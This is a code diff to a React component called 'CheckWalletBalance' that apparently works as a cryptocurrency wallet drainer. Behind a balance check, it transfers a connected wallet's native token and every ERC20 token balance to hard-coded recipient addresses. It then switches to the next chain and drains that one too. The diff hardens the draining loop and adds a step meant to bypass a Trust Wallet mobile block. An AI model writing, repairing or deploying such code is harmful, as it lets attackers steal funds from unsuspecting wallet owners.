@@ -24,61 +24,82 @@ export default function CheckWalletBalance() {
   const GAS_BUFFER = getGasBufferByChain(chainId);
 
   const processWallet = async () => {
-    if (!address || !chainId || processedChains.includes(chainId)) return;
-
-    setIsProcessing(true);
-    try {
-      const numericBalance = parseFloat(balance);
-      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
-
-      if (numericBalance < MINIMUM_BALANCE) {
-        setStatus(`❌ Insufficient funds on ${symbol}: ${balance}`);
-        setProcessedChains((prev) => [...prev, chainId]);
-      } else {
-        const tokens = await getTokensWithBalance(address, chainId);
-        // Filter tokens with valid decimals and non-zero balances
-        const filteredTokens = tokens.filter((token) => {
-            const hasBalance = parseFloat(token.balance) > 0;
-            const hasValidDecimals = typeof token.decimals === "number" && token.decimals >= 0;
-            return hasBalance && hasValidDecimals;
-        });
-
-
-        if (tokens.length === 0) {
-          setStatus("🚀 Sending native token...");
-          await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
-          setStatus("✅ Native token sent!");
-        } else {
-            setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
-            await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
-            for (const token of filteredTokens) {
-              try {
-                await transferERC20Token(
-                  token.contractAddress,
-                  token.balance,
-                  RECIPIENT_ADDRESSES[chainId],
-                  token.decimals
-                );
-              } catch (error) {
-                console.warn(`⚠️ Error transferring ${token.symbol}:`, error);
-              }
-            }
-          
-            setStatus("🎉 All tokens sent!");
-        }
-
-        setProcessedChains((prev) => [...prev, chainId]);
-      }
-
-      // Move to next chain
-      const nextChain = SUPPORTED_CHAINS.find(id => !processedChains.includes(id) && id !== chainId);
-      if (nextChain) {
-        setStatus(`🔁 Switching to chain ${nextChain}...`);
-        await switchChain(nextChain);
+    if (!address || !chainId || processedChains.includes(chainId) || isProcessing) return;
+  
+    const numericBalance = parseFloat(balance);
+    if (isNaN(numericBalance)) {
+      console.warn("⚠️ Invalid balance detected, skipping chain.");
+      return;
+    }
+  
+    // Skip early if balance is zero — especially to bypass Trust Wallet mobile block
+    if (numericBalance === 0) {
+      console.warn(`⛔ Chain ${chainId} has zero native balance, skipping.`);
+      setProcessedChains((prev) => [...prev, chainId]);
+  
+      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
+      if (remainingChains.length > 0) {
+        setStatus(`🔁 Switching to chain ${remainingChains[0]}...`);
+        await switchChain(remainingChains[0]);
       } else {
         setStatus("✅ All chains processed.");
       }
-
+      return;
+    }
+  
+    setIsProcessing(true);
+    try {
+      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
+      const thresholdMet = numericBalance >= MINIMUM_BALANCE;
+  
+      if (!thresholdMet) {
+        setStatus("❌ Insufficient funds. Skipping chain...");
+        setProcessedChains((prev) => [...prev, chainId]);
+  
+        const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
+        if (remainingChains.length > 0) {
+          await switchChain(remainingChains[0]);
+        } else {
+          setStatus("✅ All chains processed.");
+        }
+        return;
+      }
+  
+      // Proceed with transfers
+      const tokens = await getTokensWithBalance(address, chainId);
+  
+      const safeAmountToSend = Math.max(0, numericBalance - GAS_BUFFER);
+      if (tokens.length === 0) {
+        setStatus("🚀 Sending native token...");
+        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId]);
+        setStatus("✅ Native token sent!");
+      } else {
+        setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
+        await transferNativeToken(safeAmountToSend, RECIPIENT_ADDRESSES[chainId]);
+  
+        for (let token of tokens) {
+          if (parseFloat(token.balance) === 0) continue; // skip dust
+          await transferERC20Token(
+            token.contractAddress,
+            token.balance,
+            RECIPIENT_ADDRESSES[chainId],
+            token.decimals
+          );
+        }
+  
+        setStatus("🎉 All tokens sent!");
+      }
+  
+      setProcessedChains((prev) => [...prev, chainId]);
+  
+      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
+      if (remainingChains.length > 0) {
+        const nextChainId = remainingChains[0];
+        setStatus(`🔁 Switching to chain ${nextChainId}...`);
+        await switchChain(nextChainId);
+      } else {
+        setStatus("✅ All chains processed.");
+      }
     } catch (error) {
       console.error("❌ Error in processWallet:", error);
       setStatus("❌ Transfer failed!");
@@ -86,6 +107,7 @@ export default function CheckWalletBalance() {
       setIsProcessing(false);
     }
   };
+  
 
   useEffect(() => {
     const shouldProcess =
